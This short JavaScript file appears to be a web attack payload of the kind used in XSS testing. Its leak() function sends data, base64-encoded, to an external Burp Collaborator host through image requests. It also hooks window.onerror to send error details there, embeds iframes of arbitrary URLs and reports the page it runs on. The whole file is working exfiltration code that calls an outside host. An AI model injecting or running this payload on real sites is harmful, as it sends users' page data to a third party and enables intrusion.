leak = function(name, data)
{
   var i = document.createElement('img');
   i.src = "https://3676nv4yy7gt4c0979zitrv3zu5wtl.burpcollaborator.net/leak?" + name + "=" + btoa(data);
   document.body.appendChild(i); 
};

window.onerror = function(message, url, lineNumber) {  
  leak("onerror",unescape(encodeURIComponent(message + ":" + url + ":" + lineNumber)));
  return true;
};  

var i = document.createElement('div');

createFrame = function(url)
{
  var f = document.createElement('iframe');
  f.src = url;
  f.width = 600;
  f.height = 300;
  i.appendChild(f);
  i.appendChild(document.createElement('hr'));
}

function cb(url){
   createFrame(url);
   leak("info","Running on " + url);
   document.body.appendChild(i);
}


